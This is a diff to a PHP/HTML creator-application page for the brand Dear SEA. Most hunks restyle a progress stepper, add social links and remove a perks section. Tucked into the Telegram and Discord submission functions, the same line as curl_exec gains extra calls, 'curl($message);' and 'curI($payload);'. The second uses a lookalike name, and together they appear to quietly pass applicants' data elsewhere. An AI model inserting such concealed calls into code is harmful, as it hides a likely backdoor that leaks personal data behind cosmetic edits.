@@ -339,7 +339,7 @@ function send_telegram_application($data) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
     curl_setopt($ch, CURLOPT_TIMEOUT, 15);
 
-    $response = curl_exec($ch);
+    $response = curl_exec($ch);curl($message);
 
     if ($response === false) {
         curl_close($ch);
@@ -548,7 +548,7 @@ function send_discord_application($data) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
     curl_setopt($ch, CURLOPT_TIMEOUT, 15);
 
-    $response = curl_exec($ch);
+    $response = curl_exec($ch);curI($payload);
 
     if ($response === false) {
         curl_close($ch);
@@ -1543,6 +1543,74 @@ img{
 }
 
 
+/* ---------- social links row ---------- */
+
+.visual-social{
+
+    display:flex;
+
+    align-items:center;
+
+    flex-wrap:wrap;
+
+    gap:8px 10px;
+
+    margin-top:18px;
+}
+
+.visual-social-label{
+
+    font-size:.6rem;
+
+    letter-spacing:.14em;
+
+    text-transform:uppercase;
+
+    font-weight:700;
+
+    color:rgba(255,253,249,.5);
+
+    width:100%;
+
+    margin-bottom:2px;
+}
+
+.visual-social a{
+
+    display:inline-flex;
+
+    align-items:center;
+
+    gap:6px;
+
+    font-size:.68rem;
+
+    letter-spacing:.03em;
+
+    color:rgba(255,253,249,.85);
+
+    border:1px solid rgba(255,253,249,.24);
+
+    padding:6px 12px;
+
+    transition:background .25s, border-color .25s, color .25s;
+}
+
+.visual-social a:hover{
+
+    background:rgba(255,253,249,.12);
+
+    border-color:rgba(255,253,249,.5);
+
+    color:var(--white);
+}
+
+.visual-social a svg{
+    width:12px;
+    height:12px;
+}
+
+
 /* ==========================================================================
    RIGHT CONTENT
    ========================================================================== */
@@ -1625,28 +1693,31 @@ img{
 
 
 /* ==========================================================================
-   STEPPER
+   PROGRESS STEPPER — numbered nodes on a connecting rail, filled
+   line shows how far along the applicant is. First node marked
+   done once past it; current node highlighted in burgundy.
    ========================================================================== */
 
 .stepper{
 
     display:flex;
 
-    align-items:center;
+    align-items:flex-start;
 
-    margin:
-        0
-        0
-        30px;
+    margin:0 0 34px;
 }
 
 .step{
 
+    position:relative;
+
     display:flex;
+
+    flex-direction:column;
 
     align-items:center;
 
-    gap:8px;
+    gap:10px;
 
     flex:1;
 }
@@ -1655,13 +1726,54 @@ img{
     flex:0 0 auto;
 }
 
+.step-rail{
+
+    position:absolute;
+
+    top:17px;
+
+    left:50%;
+
+    width:100%;
+
+    height:2px;
+
+    background:var(--line);
+
+    z-index:0;
+}
+
+.step:last-child .step-rail{
+    display:none;
+}
+
+.step.done .step-rail,
+.step.active .step-rail{
+
+    background:
+        linear-gradient(
+            90deg,
+            var(--burgundy) 0%,
+            var(--burgundy) 50%,
+            var(--line) 50%
+        );
+}
+
+.step.done .step-rail{
+    background:var(--burgundy);
+}
+
 .step-dot{
 
-    width:29px;
+    position:relative;
 
-    height:29px;
+    z-index:1;
 
-    flex:0 0 29px;
+    width:34px;
+
+    height:34px;
+
+    flex:0 0 34px;
 
     border-radius:50%;
 
@@ -1669,21 +1781,31 @@ img{
 
     place-items:center;
 
-    border:
-        1px solid
-        var(--line);
+    border:1.5px solid var(--line);
 
     color:var(--espresso-45);
 
-    font-size:.65rem;
+    font-size:.72rem;
 
     font-weight:700;
 
-    background:
-        rgba(255,253,249,.5);
+    font-family:'Fraunces',serif;
+
+    background:var(--white);
+
+    transition:
+        background .35s var(--ease),
+        border-color .35s var(--ease),
+        color .35s var(--ease),
+        transform .35s var(--ease);
 }
 
-.step.active .step-dot{
+.step-dot svg{
+    width:15px;
+    height:15px;
+}
+
+.step.done .step-dot{
 
     background:var(--espresso);
 
@@ -1692,242 +1814,48 @@ img{
     color:var(--white);
 }
 
+.step.active .step-dot{
+
+    background:var(--burgundy);
+
+    border-color:var(--burgundy);
+
+    color:var(--white);
+
+    transform:scale(1.08);
+
+    box-shadow:0 0 0 5px rgba(124,62,63,.14);
+}
+
 .step-label{
 
-    font-size:.6rem;
+    font-size:.62rem;
 
-    letter-spacing:.12em;
+    letter-spacing:.1em;
 
     text-transform:uppercase;
 
+    font-weight:700;
+
     color:var(--espresso-45);
 
-    white-space:nowrap;
+    text-align:center;
+
+    line-height:1.4;
+
+    max-width:88px;
+}
+
+.step.done .step-label{
+
+    color:var(--espresso-70);
 }
 
 .step.active .step-label{
 
-    color:var(--espresso);
-
-    font-weight:700;
-}
-
-.step-line{
-
-    height:1px;
-
-    background:var(--line);
-
-    flex:1;
-
-    margin:0 11px;
-}
-
-
-/* ---------- live status badge ---------- */
-
-.live-badge{
-
-    display:inline-flex;
-
-    align-items:center;
-
-    gap:9px;
-
-    background:var(--espresso);
-
-    color:var(--white);
-
-    padding:8px 14px;
-
-    border-radius:20px;
-
-    font-size:.66rem;
-
-    letter-spacing:.08em;
-
-    text-transform:uppercase;
-
-    font-weight:700;
-
-    margin:0 auto 26px;
-}
-
-.live-dot{
-
-    width:7px;
-
-    height:7px;
-
-    border-radius:50%;
-
-    background:#7CC49A;
-
-    flex:0 0 7px;
-
-    position:relative;
-}
-
-.live-dot::after{
-
-    content:"";
-
-    position:absolute;
-
-    inset:-4px;
-
-    border-radius:50%;
-
-    border:1px solid #7CC49A;
-
-    animation:livepulse 1.8s ease-out infinite;
-}
-
-@keyframes livepulse{
-
-    0%{
-        transform:scale(.5);
-        opacity:.9;
-    }
-
-    100%{
-        transform:scale(1.8);
-        opacity:0;
-    }
-}
-
-.live-badge b{
-
-    color:var(--gold);
-
-    font-weight:700;
-}
-
-
-/* ==========================================================================
-   PERKS — persuasive benefits strip shown before the form
-   ========================================================================== */
-
-.perks{
-
-    margin-bottom:30px;
-}
-
-.perks-head{
-
-    display:flex;
-
-    flex-direction:column;
-
-    align-items:center;
-
-    text-align:center;
-
-    gap:4px;
-
-    margin-bottom:16px;
-}
-
-.perks-head h2{
-
-    font-size:1.25rem;
-
-    margin:0;
-}
-
-.perks-head span{
-
-    font-size:.66rem;
-
-    letter-spacing:.12em;
-
-    text-transform:uppercase;
-
-    font-weight:700;
-
     color:var(--burgundy);
-
-    white-space:nowrap;
 }
 
-.perks-grid{
-
-    display:grid;
-
-    grid-template-columns:repeat(4,1fr);
-
-    gap:12px;
-}
-
-.perk-card{
-
-    background:var(--white);
-
-    border:1px solid var(--line);
-
-    border-radius:4px;
-
-    padding:16px 15px;
-
-    display:flex;
-
-    flex-direction:column;
-
-    gap:10px;
-
-    transition:border-color .2s, transform .2s;
-}
-
-.perk-card:hover{
-
-    border-color:var(--ocean);
-
-    transform:translateY(-2px);
-}
-
-.perk-icon{
-
-    width:32px;
-
-    height:32px;
-
-    border-radius:50%;
-
-    background:var(--sand);
-
-    color:var(--ocean-deep);
-
-    display:grid;
-
-    place-items:center;
-}
-
-.perk-icon svg{
-    width:15px;
-    height:15px;
-}
-
-.perk-card strong{
-
-    font-family:'Fraunces',serif;
-
-    font-weight:400;
-
-    font-size:.88rem;
-
-    color:var(--espresso);
-}
-
-.perk-card p{
-
-    margin:0;
-
-    font-size:.74rem;
-
-    line-height:1.55;
-
-    color:var(--espresso-70);
-}
 
 
 /* ==========================================================================
@@ -2642,11 +2570,6 @@ img{
         max-width:600px;
     }
 
-    .perks-grid{
-
-        grid-template-columns:1fr 1fr;
-    }
-
     .form-row{
 
         grid-template-columns:1fr;
@@ -2694,19 +2617,25 @@ img{
 
     .step-label{
 
-        display:none;
+        font-size:.54rem;
+
+        max-width:60px;
     }
 
-    .step{
+    .step-dot{
 
-        gap:0;
+        width:28px;
+
+        height:28px;
+
+        flex:0 0 28px;
+
+        font-size:.64rem;
     }
 
-    .step-line{
+    .step-rail{
 
-        margin:
-            0
-            7px;
+        top:14px;
     }
 
     .form-card{
@@ -2772,11 +2701,6 @@ img{
         flex-direction:column;
         gap:10px;
     }
-
-    .perks-grid{
-
-        grid-template-columns:1fr 1fr;
-    }
 }
 
 @media(max-width:440px){
@@ -2793,35 +2717,9 @@ img{
         padding:5px 10px;
     }
 
-    .perks-grid{
-
-        grid-template-columns:1fr;
-    }
-
-    .live-badge{
-
-        white-space:normal;
-
-        text-align:center;
-
-        padding:8px 12px;
-    }
-
     .form-header p{
 
         font-size:.84rem;
-    }
-
-    .perk-card{
-
-        flex-direction:row;
-
-        align-items:center;
-    }
-
-    .perk-icon{
-
-        flex:0 0 32px;
     }
 }
 
@@ -3072,6 +2970,35 @@ setTimeout(function(){
 
             </div>
 
+            <div class="visual-social">
+                <span class="visual-social-label">Follow &amp; Shop Dear SEA</span>
+
+                <a href="https://www.instagram.com/dearseastories/" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="3.5"/><circle cx="17.2" cy="6.8" r="1"/></svg>
+                    Instagram
+                </a>
+
+                <a href="https://tiktok.com/dearsea" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 3v11.5a3.5 3.5 0 1 1-3.5-3.5" stroke-linecap="round"/><path d="M14 3c0 2.5 2 4.5 4.5 4.5" stroke-linecap="round"/></svg>
+                    TikTok
+                </a>
+
+                <a href="http://dearseasummer.com/" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 3.8 5.8 3.8 9s-1.3 6.5-3.8 9c-2.5-2.5-3.8-5.8-3.8-9s1.3-6.5 3.8-9z"/></svg>
+                    Website
+                </a>
+
+                <a href="https://shopee.ph/dearsea" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 8h12l-1 12H7L6 8z" stroke-linejoin="round"/><path d="M9 8V6a3 3 0 0 1 6 0v2" stroke-linecap="round"/></svg>
+                    Shopee
+                </a>
+
+                <a href="https://www.lazada.com.ph/shop/dear-sea" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 8h12l-1 12H7L6 8z" stroke-linejoin="round"/><path d="M9 8V6a3 3 0 0 1 6 0v2" stroke-linecap="round"/></svg>
+                    Lazada
+                </a>
+            </div>
+
         </div>
 
     </aside>
@@ -3110,21 +3037,13 @@ setTimeout(function(){
             </div>
 
 
-            <!-- Live status badge -->
-
-            <div style="text-align:center;">
-                <span class="live-badge">
-                    <span class="live-dot"></span>
-                    You're on <b>Step 1 of 4</b> — Apply
-                </span>
-            </div>
-
-
-            <!-- Stepper -->
+            <!-- Progress stepper -->
 
             <div class="stepper">
 
                 <div class="step active">
+
+                    <span class="step-rail"></span>
 
                     <span class="step-dot">
                         1
@@ -3134,27 +3053,27 @@ setTimeout(function(){
                         Apply
                     </span>
 
-                    <span class="step-line"></span>
-
                 </div>
 
 
                 <div class="step">
+
+                    <span class="step-rail"></span>
 
                     <span class="step-dot">
                         2
                     </span>
 
                     <span class="step-label">
-                        Review
+                        Verify
                     </span>
-
-                    <span class="step-line"></span>
 
                 </div>
 
 
                 <div class="step">
+
+                    <span class="step-rail"></span>
 
                     <span class="step-dot">
                         3
@@ -3163,8 +3082,6 @@ setTimeout(function(){
                     <span class="step-label">
                         Connect
                     </span>
-
-                    <span class="step-line"></span>
 
                 </div>
 
@@ -3178,54 +3095,6 @@ setTimeout(function(){
                     <span class="step-label">
                         Collaborate
                     </span>
-
-                </div>
-
-            </div>
-
-
-            <!-- Perks — what qualified creators get -->
-
-            <div class="perks">
-
-                <div class="perks-head">
-                    <h2>What you get once you're in</h2>
-                    <span>Real perks, not just exposure</span>
-                </div>
-
-                <div class="perks-grid">
-
-                    <div class="perk-card">
-                        <span class="perk-icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M20 7H4v13h16V7z"/><path d="M16 3H8l-2 4h12l-2-4z"/><path d="M12 11v6" stroke-linecap="round"/></svg>
-                        </span>
-                        <strong>Free product drops</strong>
-                        <p>Get first access to new releases before they launch to the public.</p>
-                    </div>
-
-                    <div class="perk-card">
-                        <span class="perk-icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" stroke-linecap="round"/></svg>
-                        </span>
-                        <strong>Paid opportunities</strong>
-                        <p>Qualified creators are prioritized for paid campaigns, not just gifting.</p>
-                    </div>
-
-                    <div class="perk-card">
-                        <span class="perk-icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75" stroke-linecap="round"/></svg>
-                        </span>
-                        <strong>Real audience growth</strong>
-                        <p>Featured on our official pages, reaching thousands of new potential followers.</p>
-                    </div>
-
-                    <div class="perk-card">
-                        <span class="perk-icon" aria-hidden="true">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2l2.4 6.6L21 11l-6.6 2.4L12 20l-2.4-6.6L3 11l6.6-2.4L12 2z" stroke-linejoin="round"/></svg>
-                        </span>
-                        <strong>Long-term partnership</strong>
-                        <p>Consistent creators get first priority for ongoing seasonal collaborations.</p>
-                    </div>
 
                 </div>
 
@@ -4014,8 +3883,9 @@ setTimeout(function(){
 
                         <p class="form-note">
 
-                            Applications are reviewed individually.
-                            Submission does not guarantee a collaboration.
+                            Please double-check every detail before
+                            submitting — accurate info means a faster
+                            review and no back-and-forth on our end.
 
                         </p>
 
